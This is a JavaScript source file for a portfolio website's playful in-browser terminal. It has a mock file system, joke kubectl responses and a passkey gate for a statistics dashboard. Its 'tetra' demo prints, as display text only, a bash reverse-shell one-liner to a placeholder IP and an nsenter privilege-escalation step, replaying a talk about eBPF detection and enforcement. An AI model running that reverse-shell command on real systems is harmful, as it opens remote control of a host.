// The terminal. A small shell over the site's own content: a file system
// (ls, cd, cat, tree), a pretend kubectl, a replay of the eBPF demo from the
// ContainerDays talk, and commands that drive the site (open, theme, resume).
//
// Security note: everything printed goes through text nodes. Nothing a
// visitor types is ever parsed as HTML, and links are only created for
// http(s) URLs and e-mail addresses found in the site's own data.

import { $, $$, reduceMotion } from "./util.js";
import { currentMode, setMode, setTheme, themeNames } from "./theme.js";
import { trickNames } from "./companion.js";

const pad = (value, width) => String(value).padEnd(width);
const has = (object, key) => Object.prototype.hasOwnProperty.call(object, key);
const isDir = (node) => node !== null && typeof node === "object";

export function initTerminal() {
  const term = $("#term");
  const dataEl = $("#term-data");
  if (!term || !dataEl) return;

  const D = JSON.parse(dataEl.textContent);
  const out = $("#term-out");
  const body = $("#term-body");
  const input = $("#term-input");
  const promptEl = $("#term-prompt");
  const titleEl = $("#term-title");
  const toggle = $("#term-toggle");
  const slot = $("#term-slot");

  // On the homepage the terminal sits in its section; elsewhere it only
  // exists as the drop-down.
  if (slot) slot.append(term);
  term.hidden = !slot;

  // ----------------------------------------------------------- file system
  // Files are functions that return lines; directories are plain objects.

  const FS = {
    "about.md": () => [`# ${D.name}`, D.title, "", ...D.about, "", `now: ${D.now}`],
    "now.txt": () => [D.now],
    "skills.txt": () => D.stack.flatMap(([group, items]) => [`${group}:`, `  ${items}`]),
    "experience.txt": () => D.jobs.map(([when, role, company]) => `  ${pad(when, 22)}${role} @ ${company}`),
    "awards.txt": () => D.awards.map(([when, text]) => `  ${pad(when, 9)}${text}`),
    "languages.txt": () => D.languages.map(([name, level]) => `  ${pad(name, 10)}${level}`),
    "contact.txt": () => [
      `  email     ${D.email}`,
      `  linkedin  ${D.links.linkedin}`,
      `  github    ${D.links.github}`,
      `  medium    ${D.links.medium}`,
      `  based in  ${D.location}`,
    ],
    "resume.pdf": () => ["Binary file. Use: resume [en|de|fr]"],
    ".secrets": () => null,
    projects: {},
    talks: {},
    blog: {},
  };
  for (const p of D.projects) {
    FS.projects[`${p.name}.md`] = () => [`# ${p.name}  (${p.year})`, p.text, "", `stack: ${p.stack}`, `repo:  ${p.repo}`];
  }
  for (const t of D.talks) {
    FS.talks[`${t.slug}.md`] = () => [`# ${t.title}`, `${t.event} · ${t.city} · ${t.date}`, `${t.slides} slides. Read them with: open talks`];
  }
  for (const post of D.posts) {
    FS.blog[`${post.id}.md`] = () => [`# ${post.title}`, "Read it with: open blog"];
  }

  let cwd = [];
  const cwdLabel = () => (cwd.length ? `~/${cwd.join("/")}` : "~");

  function nodeAt(path) {
    let node = FS;
    for (const part of path) {
      if (!isDir(node) || !has(node, part)) return undefined;
      node = node[part];
    }
    return node;
  }
  function resolve(arg) {
    const path = /^[~/]/.test(arg) ? [] : cwd.slice();
    for (const part of arg.replace(/^~\/?/, "").split("/")) {
      if (!part || part === ".") continue;
      if (part === "..") path.pop();
      else path.push(part);
    }
    return path;
  }
  function renderPrompt() {
    const dir = document.createElement("b");
    dir.textContent = cwdLabel();
    promptEl.replaceChildren("visitor@mella7:", dir, "$");
    titleEl.textContent = `visitor@mella7.me: ${cwdLabel()}`;
  }

  // ---------------------------------------------------------------- output

  const LINK = /(https?:\/\/[^\s]+|[\w.+-]+@[\w-]+\.[\w.]+)/g;

  function print(kind, text) {
    const line = document.createElement("p");
    line.className = `t-line t-${kind}`;
    if (kind === "in") {
      const prompt = document.createElement("span");
      prompt.className = "t-p";
      prompt.textContent = `visitor@mella7:${cwdLabel()}$ `;
      line.append(prompt, text);
    } else {
      let last = 0;
      for (const match of text.matchAll(LINK)) {
        line.append(text.slice(last, match.index));
        const link = document.createElement("a");
        const value = match[0];
        if (value.startsWith("http")) {
          link.href = value;
          link.target = "_blank";
          link.rel = "noopener noreferrer";
        } else {
          link.href = `mailto:${value}`;
        }
        link.textContent = value;
        line.append(link);
        last = match.index + value.length;
      }
      line.append(text.slice(last));
    }
    out.append(line);
    // Keep the log from growing without bound.
    while (out.childElementCount > 400) out.firstElementChild.remove();
    body.scrollTop = body.scrollHeight;
  }

  // Output arrives line by line. A new command or Ctrl+C cancels the rest.
  let job = 0;
  let timers = [];
  function cancel() {
    job++;
    timers.forEach(clearTimeout);
    timers = [];
  }
  function stream(lines, gap = 18) {
    const mine = job;
    const delay = reduceMotion ? 0 : gap;
    lines.forEach((entry, i) => {
      const [kind, text] = Array.isArray(entry) ? entry : ["out", entry];
      timers.push(
        setTimeout(() => {
          if (mine === job) print(kind, text);
        }, i * delay),
      );
    });
  }

  // -------------------------------------------------------------- commands

  const mark = (status) => (status === "passed" ? "[x]" : status === "in-progress" ? "[~]" : "[ ]");

  function navigate(key) {
    const path = D.pages[key];
    if (!path) return false;
    closeQuake();
    const [pathname, hash] = path.split("#");
    const here = location.pathname.replace(/index\.html$/, "");
    if (hash && here === D.base + pathname) {
      document.getElementById(hash)?.scrollIntoView({ behavior: reduceMotion ? "auto" : "smooth" });
    } else {
      setTimeout(() => location.assign(D.base + path), 350);
    }
    return true;
  }

  const COMMANDS = {
    help: {
      about: "show this list",
      run: () => [
        ["hl", "Commands"],
        ...Object.entries(COMMANDS)
          .filter(([, c]) => c.about)
          .map(([name, c]) => `  ${pad(name, 12)}${c.about}`),
        "",
        ["sys", "Tab completes commands and paths. Up/Down recall history. Ctrl+L clears, Ctrl+C stops."],
      ],
    },
    whoami: { about: "who is this", run: () => FS["about.md"]() },
    ls: {
      about: "list files: ls [dir]",
      run(args) {
        const all = /(^|\s)-\w*a/.test(args);
        const target = args.replace(/(^|\s)-\w+/g, "").trim();
        const path = target ? resolve(target) : cwd;
        const node = nodeAt(path);
        if (node === undefined) return [["err", `ls: ${target}: no such file or directory`]];
        if (!isDir(node)) return [`  ${path[path.length - 1]}`];
        const names = Object.keys(node)
          .filter((name) => all || !name.startsWith("."))
          .map((name) => (isDir(node[name]) ? `${name}/` : name));
        return [`  ${names.join("   ")}`];
      },
    },
    cd: {
      about: "change directory: cd projects",
      run(args) {
        if (!args) {
          cwd = [];
          renderPrompt();
          return [];
        }
        const path = resolve(args.replace(/\/+$/, ""));
        const node = nodeAt(path);
        if (node === undefined) {
          return [["err", `cd: no such file or directory: ${args}`], ["sys", "To open a page of the site use: open <page>"]];
        }
        if (!isDir(node)) return [["err", `cd: not a directory: ${args}`]];
        cwd = path;
        renderPrompt();
        return [];
      },
    },
    pwd: { run: () => [`/home/visitor${cwd.length ? `/${cwd.join("/")}` : ""}`] },
    cat: {
      about: "print a file: cat about.md",
      run(args) {
        if (!args) return [["sys", "usage: cat <file>   (see ls)"]];
        const node = nodeAt(resolve(args));
        if (node === undefined) return [["err", `cat: ${args}: no such file or directory`]];
        if (isDir(node)) return [["err", `cat: ${args}: is a directory`]];
        return node() ?? [["err", `cat: ${args}: permission denied. Kyverno says no.`]];
      },
    },
    tree: {
      about: "show the whole file tree",
      run() {
        const lines = ["~"];
        (function walk(node, prefix) {
          const names = Object.keys(node).filter((name) => !name.startsWith("."));
          names.forEach((name, i) => {
            const last = i === names.length - 1;
            lines.push(`${prefix}${last ? "└── " : "├── "}${name}${isDir(node[name]) ? "/" : ""}`);
            if (isDir(node[name])) walk(node[name], prefix + (last ? "    " : "│   "));
          });
        })(FS, "");
        return lines;
      },
    },
    skills: { about: "technical skills", run: () => FS["skills.txt"]() },
    projects: {
      about: "things I built",
      run: () => D.projects.flatMap((p) => [["hl", `${p.name}  (${p.year})`], `  ${p.text}`, `  ${p.stack}`, `  ${p.repo}`, ""]),
    },
    experience: { about: "where I worked", run: () => FS["experience.txt"]() },
    talks: {
      about: "conference talks",
      run: () => [
        ...D.talks.flatMap((t) => [["hl", `${t.event} · ${t.city} (${t.date})`], `  "${t.title}"`, `  ${t.slides} slides`, ""]),
        ["sys", "Read the slides with: open talks"],
      ],
    },
    certs: {
      about: "certifications",
      run: () => [
        ...D.certs.map((c) => `  ${mark(c.status)} ${c.name} (${c.short})`),
        "",
        ["sys", "  [x] passed   [~] in progress   [ ] next goal"],
      ],
    },
    awards: { about: "awards", run: () => FS["awards.txt"]() },
    contact: { about: "how to reach me", run: () => [...FS["contact.txt"](), "", ["sys", "Or write to me with the form: open contact"]] },
    resume: {
      about: "resume link: resume [en|de|fr]",
      run(args) {
        const lang = ["en", "de", "fr"].find((code) => args.toLowerCase().includes(code)) ?? "en";
        return [`Resume (${lang.toUpperCase()}): ${D.resume[lang]}`];
      },
    },
    open: {
      about: "go to a page: open talks",
      run(args) {
        const key = args.trim().toLowerCase();
        if (!navigate(key)) return [["sys", `usage: open <${Object.keys(D.pages).join("|")}>`]];
        return [["ok", `-> ${D.pages[key]}`]];
      },
    },
    theme: {
      about: "recolour the site: theme blue",
      run(args) {
        const name = args.trim().toLowerCase();
        if (!setTheme(name)) return [["sys", `usage: theme <${themeNames().join("|")}|auto>`]];
        return [["ok", name === "auto" ? "Colours rotate again." : `theme set to ${name}. It stays until you type: theme auto`]];
      },
    },
    mode: {
      about: "light or dark: mode light",
      run(args) {
        const wanted = args.trim().toLowerCase() || (currentMode() === "light" ? "dark" : "light");
        if (!setMode(wanted)) return [["sys", "usage: mode <light|dark>"]];
        return [["ok", `${wanted} mode on.`]];
      },
    },
    avatar: {
      about: `make the avatar do a trick: avatar ${trickNames()[2]}`,
      run(args) {
        const trick = args.trim().toLowerCase();
        if (trick && !trickNames().includes(trick)) return [["sys", `usage: avatar <${trickNames().join("|")}>`]];
        document.dispatchEvent(new CustomEvent("companion:do", { detail: trick || undefined }));
        return [["ok", trick ? `${trick}!` : "Surprise me."], ["sys", "Look at the bottom of the window."]];
      },
    },
    countries: { about: "where I have been", run: () => [`${D.countries.length} countries so far:`, `  ${D.countries.join(", ")}`] },
    neofetch: {
      about: "system info",
      run: () => [
        "     ▄▄▄▄▄▄▄       mohamed@mella7",
        "   ▄█▀▀███▀▀█▄     ───────────────────────────",
        `  ██   ███   ██    Role      ${D.title}`,
        `  ██▄▄█████▄▄██    Location  ${D.location}`,
        `  ██  █ ▀ █  ██    Certs     ${D.certs.filter((c) => c.status === "passed").length} passed, CKS in progress`,
        `   ▀█▄▄▄▄▄▄▄█▀     Talks     ${D.talks.length} in 2026`,
        "                   Shell     zsh, obviously",
        "                   Uptime    since 2019",
      ],
    },
    kubectl: { about: "get pods | certs | talks | projects | nodes", run: kubectl },
    tetra: { about: "live eBPF events: tetra getevents", run: tetra },
    man: {
      run: () => [
        "MELLA7(1)", "", "NAME", "    mella7 - cloud-native and Kubernetes engineer", "",
        "SYNOPSIS", "    mella7 [--build platforms] [--break them] [--fix what-broke]", "",
        "SEE ALSO", "    whoami, projects, talks, contact",
      ],
    },
    history: { run: () => history.slice().reverse().map((entry, i) => `  ${pad(i + 1, 4)}${entry}`) },
    echo: { run: (args) => [args] },
    date: { run: () => [`${new Date().toLocaleString("en-GB", { timeZone: "Europe/Berlin", dateStyle: "full", timeStyle: "short" })} (Berlin)`] },
    sudo: {
      run: (args) =>
        /hire/.test(args)
          ? [["ok", `[sudo] offer accepted for review. Send it to ${D.email}`]]
          : [["err", "visitor is not in the sudoers file. This incident will be reported."]],
    },
    rm: { run: () => [["err", "rm: permission denied. Kyverno says no."]] },
    exit: {
      run() {
        if (term.classList.contains("is-quake")) {
          closeQuake();
          return [];
        }
        return ["There is no exit. Try 'contact' instead."];
      },
    },
    clear: {
      about: "clear the screen",
      run() {
        out.replaceChildren();
        return [];
      },
    },
  };

  function kubectl(args) {
    const tokens = args.split(/\s+/).filter(Boolean);
    const hireMe = /hire-?me/.test(args);
    const [verb, resource] = tokens;

    if (verb === "version") return ["Client Version: v1.34.1", "Server Version: v1.34.1 (mella7-prod)"];
    if (verb === "logs") {
      return [
        "INFO  reconciling career/mohamed-ali",
        "INFO  desired: platform-engineer, current: open-to-offers",
        "INFO  requeue after contact",
      ];
    }
    if (verb === "delete") {
      return [["err", 'Error from server (Forbidden): admission webhook "kyverno" denied the request: visitors cannot delete.']];
    }
    if (verb === "describe") {
      return [
        "Name:         mohamed-ali-0",
        `Namespace:    ${hireMe ? "hire-me" : "default"}`,
        "Labels:       role=platform-engineer, focus=security",
        "Status:       Running",
        "Conditions:   Ready=True, OpenToWork=True, RelocationReady=True",
        "Events:       Normal  Scheduled  interview pending. Run: contact",
      ];
    }
    if (verb !== "get" || !resource) {
      return [["sys", "usage: kubectl get <pods|nodes|certs|talks|projects|ns> [-n hire-me]"]];
    }

    const kind = resource.replace(/s$/, "");
    if (["pod", "po", "all"].includes(kind)) {
      if (hireMe) {
        return [
          "NAME                     READY   STATUS    RESTARTS   AGE",
          "available-for-hire-0     1/1     Running   0          1d",
          "relocation-ready         1/1     Running   0          1d",
          "",
          ["ok", `Contact the maintainer: ${D.email}`],
        ];
      }
      return [
        "NAME                          READY   STATUS    RESTARTS   AGE",
        "portfolio-frontend-7d4b       1/1     Running   0          42d",
        "tetragon-runtime-x9k2         1/1     Running   0          42d",
        "job-search-controller-1a7f    1/1     Running   97         3y",
        "sleep-deployment-0            0/1     Pending   0          42d",
        "",
        ["sys", "tip: kubectl get pods -n hire-me"],
      ];
    }
    if (["node", "no"].includes(kind)) {
      return [
        "NAME      STATUS   ROLES           VERSION",
        "aws-1     Ready    control-plane   v1.34.1",
        "azure-1   Ready    worker          v1.34.1",
        "okd-1     Ready    worker          v1.34.1",
      ];
    }
    if (["n", "namespace"].includes(kind)) {
      return ["NAME          STATUS   AGE", "default       Active   3y", "hire-me       Active   1d", "kube-system   Active   3y"];
    }
    if (["cert", "certification"].includes(kind)) {
      const state = { passed: "Ready", "in-progress": "Progressing", goal: "Pending" };
      return ["NAME            ISSUER              STATUS", ...D.certs.map((c) => pad(c.short, 16) + pad(c.issuer, 20) + state[c.status])];
    }
    if (kind === "talk") {
      return [
        "NAME                               CITY        DATE          SLIDES",
        ...D.talks.map((t) => pad(t.slug, 35) + pad(t.city.split(",")[0], 12) + pad(t.date, 14) + t.slides),
      ];
    }
    if (kind === "project") {
      return [
        "NAME                                YEAR   STACK",
        ...D.projects.map((p) => pad(p.name, 36) + pad(p.year, 7) + p.stack.split(" · ").slice(0, 2).join(",")),
      ];
    }
    return [["err", `error: the server doesn't have a resource type "${resource}"`]];
  }

  // A replay of the two-act demo from the ContainerDays talk: detect a
  // reverse shell and a privilege escalation, then enforce.
  function tetra(args) {
    if (!/getevents/.test(args)) return [["sys", "usage: tetra getevents   (Ctrl+C to stop)"]];
    stream(
      [
        ["sys", "Act 1: detect. Streaming runtime events, Ctrl+C to stop."],
        "process default/web-7d4b /usr/bin/node server.js",
        "process default/web-7d4b /bin/sh -c 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'",
        ["err", "connect default/web-7d4b tcp 10.0.2.14:41822 -> 203.0.113.7:4444   <- reverse shell"],
        "process default/web-7d4b /usr/bin/nsenter -t 1 -m -u -i -n",
        ["err", "process default/web-7d4b setuid(0) CAP_SYS_ADMIN   <- privilege escalation"],
        "",
        ["sys", "Act 2: enforce. The same detections now carry action=Sigkill."],
        "process default/web-7d4b /bin/sh -c 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'",
        ["ok", "exit    default/web-7d4b /bin/sh SIGKILL"],
        ["ok", "Stopped at the syscall. The slides: open talks"],
      ],
      520,
    );
    return [];
  }

  // ------------------------------------------------------------- execution

  const history = [];
  let historyIndex = -1;

  // ---------------------------------------------- hidden statistics access
  // Typing the secret word (SITE.statsCommand) asks for the passkey. The
  // passkey is checked by the server; this page never knows the right answer.
  // It is typed masked, is not kept in the history and is not printed.
  let askingPasskey = false;

  function askPasskey() {
    askingPasskey = true;
    input.type = "password";
    input.value = "";
    promptEl.textContent = "passkey:";
    print("sys", "Restricted area. Enter the passkey (Esc cancels).");
  }
  function stopAsking() {
    askingPasskey = false;
    input.type = "text";
    input.value = "";
    renderPrompt();
  }
  async function submitPasskey(passkey) {
    stopAsking();
    if (!passkey) return;
    if (!D.stats.api) {
      // The dashboard lives on another host: it asks for the passkey itself.
      print("sys", "Opening the dashboard login...");
      location.assign(D.stats.page);
      return;
    }
    print("sys", "Checking...");
    let response;
    try {
      response = await fetch(`${D.stats.api}?days=1`, { headers: { Authorization: `Bearer ${passkey}` }, cache: "no-store" });
    } catch {
      print("err", "The statistics server is not reachable.");
      return;
    }
    if (response.ok) {
      try {
        sessionStorage.setItem("stats-token", passkey); // the dashboard reads it; gone when the tab closes
      } catch {
        /* the dashboard will ask again */
      }
      print("ok", "Access granted. Opening the dashboard...");
      setTimeout(() => location.assign(D.stats.page), 500);
    } else if (response.status === 401) print("err", "Access denied.");
    else if (response.status === 429) print("err", "Too many attempts. Wait a minute.");
    else if (response.status === 503) print("err", "Statistics are switched off on the server (STATS_TOKEN is not set).");
    else print("err", "No statistics server answers here.");
  }

  function execute(raw) {
    cancel();
    const line = raw.trim().slice(0, 200);
    if (D.stats && line.toLowerCase() === D.stats.command) {
      print("in", "*".repeat(line.length)); // do not leave the word on screen
      askPasskey();
      return;
    }
    print("in", line);
    if (!line) return;
    history.unshift(line);
    if (history.length > 50) history.pop();
    historyIndex = -1;

    const name = line.split(/\s+/)[0].toLowerCase();
    const args = line.slice(name.length).trim();
    // Statistics: only the command name, never what was typed after it.
    document.dispatchEvent(new CustomEvent("track", { detail: { name: "terminal", data: { cmd: has(COMMANDS, name) ? name : "(unknown)" } } }));
    if (!has(COMMANDS, name)) {
      stream([["err", `zsh: command not found: ${name}`], ["sys", "Type 'help' to see what works."]]);
      return;
    }
    stream(COMMANDS[name].run(args) ?? []);
  }

  // Tab completion: command names first, then sub-commands or paths.
  const SUB = {
    theme: [...themeNames(), "auto"],
    mode: ["light", "dark"],
    avatar: trickNames(),
    open: Object.keys(D.pages),
    resume: ["en", "de", "fr"],
    kubectl: ["get", "describe", "logs", "version"],
    tetra: ["getevents"],
  };
  const KUBE_RESOURCES = ["pods", "nodes", "certs", "talks", "projects", "ns"];

  function complete() {
    const value = input.value;
    const tokens = value.split(/\s+/);
    let last = tokens[tokens.length - 1];
    let candidates;

    if (tokens.length === 1) {
      candidates = Object.keys(COMMANDS).filter((name) => COMMANDS[name].about);
    } else {
      const command = tokens[0].toLowerCase();
      if (command === "kubectl" && tokens[tokens.length - 2] === "get") candidates = KUBE_RESOURCES;
      else if (SUB[command] && tokens.length === 2) candidates = SUB[command];
      else if (["cd", "cat", "ls"].includes(command)) {
        const slash = last.lastIndexOf("/");
        const dir = slash > -1 ? last.slice(0, slash + 1) : "";
        const node = nodeAt(resolve(dir || "."));
        if (!isDir(node)) return;
        candidates = Object.keys(node)
          .filter((name) => !name.startsWith(".") && (command !== "cd" || isDir(node[name])))
          .map((name) => dir + name + (isDir(node[name]) ? "/" : ""));
      } else return;
    }

    const hits = candidates.filter((c) => c.toLowerCase().startsWith(last.toLowerCase()));
    if (!hits.length) return;
    let fill = hits[0];
    if (hits.length > 1) {
      let i = 0;
      while (hits.every((hit) => hit[i] && hit[i] === hits[0][i])) i++;
      fill = hits[0].slice(0, i);
      if (fill.length <= last.length) {
        print("in", value);
        print("sys", `  ${hits.join("   ")}`);
        return;
      }
    }
    tokens[tokens.length - 1] = fill + (hits.length === 1 && !fill.endsWith("/") ? " " : "");
    input.value = tokens.join(" ");
  }

  input.addEventListener("keydown", (event) => {
    // The visitor starts typing while a demo is typing itself: the demo yields.
    if (autoTyping && event.isTrusted) {
      cancel();
      autoTyping = false;
      demoPlayed = true;
      input.value = "";
    }
    if (askingPasskey) {
      if (event.key === "Enter") submitPasskey(input.value);
      else if (event.key === "Escape" || (event.key === "c" && event.ctrlKey)) {
        event.stopPropagation();
        stopAsking();
        print("sys", "Cancelled.");
      } else if (event.key === "Tab" || event.key === "ArrowUp" || event.key === "ArrowDown") event.preventDefault();
      return;
    }
    if (event.key === "Enter") {
      execute(input.value);
      input.value = "";
    } else if (event.key === "Tab") {
      event.preventDefault();
      complete();
    } else if (event.key === "ArrowUp") {
      event.preventDefault();
      if (historyIndex + 1 < history.length) input.value = history[++historyIndex];
    } else if (event.key === "ArrowDown") {
      event.preventDefault();
      historyIndex = Math.max(-1, historyIndex - 1);
      input.value = historyIndex >= 0 ? history[historyIndex] : "";
    } else if (event.key === "l" && event.ctrlKey) {
      event.preventDefault();
      cancel();
      out.replaceChildren();
    } else if (event.key === "c" && event.ctrlKey && !String(getSelection())) {
      event.preventDefault();
      cancel();
      print("in", `${input.value}^C`);
      input.value = "";
    }
  });

  /** Type a command into the prompt as if by hand, then run it. */
  let autoTyping = false;
  function typeAndRun(command, then) {
    cancel();
    if (askingPasskey) stopAsking();
    const mine = job;
    input.value = "";
    autoTyping = true;
    if (reduceMotion) {
      execute(command);
      then?.();
      return;
    }
    let i = 0;
    (function typeNext() {
      if (mine !== job) return;
      if (i < command.length) {
        input.value += command[i++];
        timers.push(setTimeout(typeNext, 38 + Math.random() * 40));
      } else {
        timers.push(
          setTimeout(() => {
            input.value = "";
            autoTyping = false;
            execute(command);
            then?.();
          }, 220),
        );
      }
    })();
  }

  // ------------------------------------------------------- drop-down mode

  let demoPlayed = false;

  function openQuake() {
    demoPlayed = true; // opened on purpose: no self-running demo
    term.hidden = false;
    term.classList.add("is-quake");
    toggle.textContent = "Esc close";
    input.focus({ preventScroll: true });
    body.scrollTop = body.scrollHeight;
  }
  function closeQuake() {
    if (!term.classList.contains("is-quake")) return;
    term.classList.remove("is-quake");
    toggle.textContent = "Ctrl+K drop down";
    term.hidden = !slot;
    input.blur();
  }
  const toggleQuake = () => (term.classList.contains("is-quake") ? closeQuake() : openQuake());

  toggle.addEventListener("click", (event) => {
    event.stopPropagation();
    toggleQuake();
  });
  $("#term-fab")?.addEventListener("click", toggleQuake);

  window.addEventListener("keydown", (event) => {
    const typing = /^(INPUT|TEXTAREA|SELECT)$/.test(event.target.tagName) && event.target !== input;
    if ((event.key === "k" && (event.ctrlKey || event.metaKey)) || (event.key === "`" && !typing)) {
      event.preventDefault();
      toggleQuake();
    } else if (event.key === "Escape") {
      closeQuake();
    }
  });

  // Focus the prompt when the terminal is clicked, unless text is being selected.
  term.addEventListener("click", (event) => {
    if (event.target.closest("a, button")) return;
    if (!String(getSelection())) input.focus({ preventScroll: true });
  });

  for (const chip of $$("[data-run]", term)) {
    chip.addEventListener("click", (event) => {
      event.stopPropagation();
      demoPlayed = true;
      typeAndRun(chip.dataset.run);
      input.focus({ preventScroll: true });
    });
  }
  // Buttons elsewhere on the page that answer through the terminal.
  for (const trigger of $$("[data-term]")) {
    trigger.addEventListener("click", () => {
      demoPlayed = true;
      openQuake();
      typeAndRun(trigger.dataset.term);
    });
  }

  renderPrompt();
  print("ok", "Welcome to mella7.me. This shell is the whole CV.");
  print("sys", "Type a command, press Tab to complete, or pick one on the right.");
  print("out", "");

  // The first time the docked terminal scrolls into view it demonstrates itself.
  if (slot && "IntersectionObserver" in window) {
    const observer = new IntersectionObserver(
      ([entry]) => {
        if (!entry.isIntersecting || demoPlayed || term.classList.contains("is-quake")) return;
        demoPlayed = true;
        observer.disconnect();
        setTimeout(() => {
          typeAndRun("whoami", () => {
            timers.push(setTimeout(() => typeAndRun("kubectl get pods -n hire-me"), 1500));
          });
        }, 500);
      },
      { threshold: 0.5 },
    );
    observer.observe(term);
  }
}
